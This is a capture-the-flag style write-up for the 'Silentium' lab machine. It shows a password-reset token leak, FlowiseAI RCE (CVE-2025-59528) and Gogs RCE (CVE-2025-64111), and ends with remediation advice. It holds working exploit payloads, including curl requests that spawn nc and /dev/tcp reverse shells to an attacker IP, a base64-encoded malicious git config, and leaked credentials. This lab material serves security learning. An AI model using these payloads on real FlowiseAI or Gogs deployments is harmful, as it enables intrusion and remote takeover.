
| Property         | Value                                                                                              |
| ---------------- | -------------------------------------------------------------------------------------------------- |
| **OS**           | Linux                                                                                              |
| **Difficulty**   | Easy                                                                                               |
| **Release Date** | 2026-04-11                                                                                         |
| **State**        | Active                                                                                             |
| **IP**           | 10.129.63.70                                                                                       |
| **Techniques**   | vhost enumeration, token disclosure, FlowiseAI RCE, docker escape, local port forwarding, Gogs RCE |
| **Tags**         | #web #docker #privesc #linux                                                                       |

---
## Summary

Silentium is an easy Linux machine hosting a corporate page on port 80 and a vhost running a FlowiseAI instance. The password reset endpoint on the vhost leaks a temporary token in the API response, allowing an unauthenticated attacker to reset the password of user `ben` and gain access to the FlowiseAI dashboard. FlowiseAI runs version 3.0.5, vulnerable to RCE (CVE-2025-59528), that is leveraged to gain a shell in a docker container as root. Plaintext credentials are stored in the container's environment variables and give SSH access to the host as `ben`. An internal Gogs instance running as root is exposed on localhost port 3001 and accessible via SSH local port forwarding. Gogs 0.13.3 is also vulnerable to RCE (CVE-2025-64111), which allows symlink injection through the API to overwrite `.git/config` with an arbitrary `sshCommand`, achieving remote code execution as root.

---
## Enumeration

```
echo '10.129.63.70 silentium.htb' | sudo tee -a /etc/hosts
```

Added the IP address of the machine to the `/etc/hosts` file.

### Nmap Scan

```
sudo nmap -sC -sV silentium.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-11 09:01 EDT
Nmap scan report for silentium.htb (10.129.63.70)
Host is up (0.043s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Silentium | Institutional Capital & Lending Solutions
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 10.52 seconds
```

### Service Enumeration

The web application on port 80 shows a corporate page for Silentium, an institutional financial firm.

![](./screens/1.png)

The Leadership section of the site discloses employee names, including `Ben`, which can be used to gather a valid email address later on.

![](./screens/2.png)

### Vhost Discovery

```
ffuf -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u http://silentium.htb/ \
  -H 'Host: FUZZ.silentium.htb' \
  -fs 178

staging   [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 40ms]
```

```
echo '10.129.63.70 staging.silentium.htb' | sudo tee -a /etc/hosts
```

`staging.silentium.htb` hosts a FlowiseAI login page. 

The login form returns two distinct error messages depending on whether the submitted email exists: 
`User Not Found` for unknown accounts and `Incorrect Email or Password` for existing ones.

![](./screens/3.png)

Submitting `ben@silentium.htb` returns `Incorrect Email or Password`, confirming the account exists.

![](./screens/4.png)

---
## Foothold

### Token Disclosure in Password Reset

Intercepting the forgot-password request to `/api/v1/account/forgot-password` reveals that the server returns the temporary reset token in the JSON response body, rather than sending it only via email. This allows an unauthenticated attacker who knows a valid email address to reset that user's password without any interaction.

![](./screens/5.png)

The password reset form on `staging.silentium.htb` was throwing a 500 Internal Server Error and it was necessary to start multiple times the machine to get a successful password reset.

![](./screens/6.png)

The reset was completed with `curl` using the token disclosed in the intercepted response:

```shell
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"ZRuNC7vCRukaXDZrj6wH7KpTUygigWX7VyhWso5TdAyRnI3wwaGQoLyan6yX1x86","password":"Password1!"}}'
```

This successfully resets `ben`'s password, granting access to the FlowiseAI dashboard.

**Vulnerable FlowiseAI version 3.0.5:**

![](./screens/7.png)

### CVE-2025-59528

The `CustomMCP` node in FlowiseAI allows users to supply a `mcpServerConfig` string to configure an external MCP server connection. Internally, the `convertToValidJSONString` function passes this input directly to JavaScript's `Function()` constructor to evaluate it, which acts essentially as a server-side `eval()`. Because this executes with full Node.js runtime privileges, it provides unrestricted access to built-in modules such as `child_process`, enabling arbitrary OS command execution.
### Exploitation

RCE is confirmed by triggering a callback request using the API key visible in the Flowise app:

```shell
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"curl http://10.10.14.224:4444/\");return 1;})()})"
    }
  }'
```

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.224] from (UNKNOWN) [10.129.63.92] 37748
GET / HTTP/1.1
Host: 10.10.14.224:4444
User-Agent: curl/8.14.1
Accept: */*
```

Reverse shell:

```shell
curl -s http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(()=>{process.mainModule.require(\"child_process\").exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.224 4444 >/tmp/f\");return 1;})()})"}}'
```

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.224] from (UNKNOWN) [10.129.63.92] 46373
/ # whoami
root
```

Shell obtained as `root` inside a Docker container.

---
## User Flag

### Docker Container Escape

Credentials for the host system are stored as plaintext environment variables inside the container:

```
/ # env
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge
SENDER_EMAIL=ben@silentium.htb
...
```

The `SMTP_PASSWORD` value is also`ben` SSH password. Credential reuse grants SSH access to the host:

```
ssh ben@silentium.htb
# password: r04D!!_R4ge

ben@silentium:~$ cat user.txt
d2a3dfb8f8ef17484af075677d345fae
```

---
## Privilege Escalation

### Enumeration

Process enumeration reveals a Gogs instance running as root:

```shell
ben@silentium:~$ ps aux | grep root
root  1535  ...  /opt/gogs/gogs/gogs web
```

Port enumeration confirms it is bound exclusively to localhost on port 3001:

```shell
ben@silentium:~$ ss -tlpn
LISTEN  0  4096  127.0.0.1:3001  0.0.0.0:*
```

The service is forwarded locally via SSH:

```shell
ssh -L 1234:localhost:3001 ben@silentium.htb
```

The Gogs interface is then accessible at `http://localhost:1234`.

![](./screens/9.png)

**Vulnerable Gogs version 0.13.3:**

```
ben@silentium:~$ /opt/gogs/gogs/gogs --version
Gogs version 0.13.3
```

### CVE-2025-64111

Gogs 0.13.3 contains an incomplete fix for CVE-2024-56731. The original vulnerability allowed writing arbitrary files into the `.git` directory; the patch attempted to block this, but the restriction can still be bypassed through a combination of symlink staging and the file contents API. The attack works as follows:

1. A symlink pointing to `.git/config` is committed to a repository and pushed via the standard git protocol, which does not enforce Gogs' path restrictions.
2. The Gogs API's file update endpoint (`PUT /api/v1/repos/:owner/:repo/contents/:path`) is then used to write through that symlink, replacing `.git/config` with an attacker-controlled version.
3. The malicious config contains a `core.sshCommand` command. When Gogs performs any git operation over SSH on that repository (as root), the injected command is executed instead of the real SSH binary.

### Exploitation

A new repository and API token are created in the Gogs interface:

![](./screens/10.png)

![](./screens/11.png)

The repository is cloned, a symlink targeting `.git/config` is added and pushed:

```shell
git clone http://localhost:1234/test/root.git
cd root
git init
ln -s .git/config link
git add link
git commit -m "add"
git push
```

A malicious git config which contains a reverse shell `sshCommand`:

```
[core]
        sshCommand = bash -c 'bash -i >& /dev/tcp/10.10.14.224/4444 0>&1'
[remote "origin"]
        url = ssh://git@localhost/test/root.git
```

The config is base64-encoded and written through the symlink via the API:

```shell
base64 config.txt
W2NvcmVdCglzc2hDb21tYW5kID0gYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4x
NC4yMjQvNDQ0NCAwPiYxJwpbcmVtb3RlICJvcmlnaW4iXQoJdXJsID0gc3NoOi8vZ2l0QGxvY2Fs
aG9zdC90ZXN0L3Jvb3QuZ2l0Cg==

curl -X PUT http://localhost:1234/api/v1/repos/test/root/contents/link \
  -H "Content-Type: application/json" \
  -H "Authorization: token 920ab0e03053abe9fd39c412713d435b02ac470c" \
  -d '{"message":"update","committer":{"name":"test","email":"test@test.com"},"content":"W2NvcmVdCglzc2hDb21tYW5kID0gYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjQvNDQ0NCAwPiYxJwpbcmVtb3RlICJvcmlnaW4iXQoJdXJsID0gc3NoOi8vZ2l0QGxvY2FsaG9zdC90ZXN0L3Jvb3QuZ2l0Cg=="}'
```

When Gogs processes the next SSH-based git operation on the repository as root, the injected `sshCommand` executes the reverse shell:

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.224] from (UNKNOWN) [10.129.63.92] 56076
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/1# cat /root/root.txt
db1730a1c68604e34db8ae44f75b54ee
```

---
## Remediation

- **Token disclosure in password reset:** The temporary reset token must never be returned in the API response. It should be transmitted exclusively out-of-band (e.g. via email).
- **CVE-2025-59528:** Upgrade FlowiseAI to version 3.0.6 or later.
- **Credentials in container environment variables:** Avoid injecting sensitive credentials as plaintext environment variables in Docker containers. Use a secrets manager or mounted secrets with appropriate permissions instead.
- **CVE-2025-64111:** Upgrade Gogs to version 0.13.4 or 0.14.0+dev.

---
## References

- [CVE-2025-59528](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p)
- [CVE-2025-64111](https://github.com/gogs/gogs/security/advisories/GHSA-gg64-xxr9-qhjp)